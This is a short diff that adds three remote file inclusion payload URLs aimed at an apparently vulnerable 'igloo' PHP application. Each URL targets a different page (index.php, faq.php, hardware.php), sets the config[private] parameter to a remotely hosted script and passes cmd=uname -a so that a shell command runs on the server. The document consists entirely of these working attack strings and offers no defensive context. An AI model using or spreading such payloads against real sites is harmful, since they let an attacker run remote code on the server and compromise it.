@@ -1,0 +1,3 @@
+http://www.example.com/[igloo_Path]/html/index.php?config[private]=http://www.example.com/x.txt?&amp;cmd=uname -a
+http://www.example.com/[igloo_Path]/html/faq.php?config[private]=http://www.example.com/x.txt?&amp;cmd=uname -a
+http://www.example.com/[igloo_Path]/html/hardware.php?config[private]=http://www.example.com/x.txt?&amp;cmd=uname -a
